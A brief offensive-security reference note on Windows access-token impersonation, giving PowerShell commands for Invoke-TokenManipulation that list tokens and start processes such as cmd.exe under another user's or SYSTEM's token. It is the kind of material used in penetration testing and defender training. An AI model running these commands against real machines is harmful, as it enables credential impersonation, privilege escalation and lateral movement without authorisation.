
Tokens can be impersonated from other users with session/running processes on the machine.
There are numerous ways token manipulation can be achieved.

A powershell script `Invoke-TokenManipulation` can be used to enumerate and impersonate tokens. It requires admin privs. This allows you to use another user's credentials over the network by creating a process with their logon token.

```powershell
#Show all tokens available on the machine
Invoke-TokenManipulation -ShowAll

#Show only unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate

#Start process with the token of a specific user
Invoke-TokenManipulation -CreateProcess "process_name" -Username "username"
#(could be useful to spawn a process as system when you are admin but not system)


#Start a process with the token of another process
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500
```

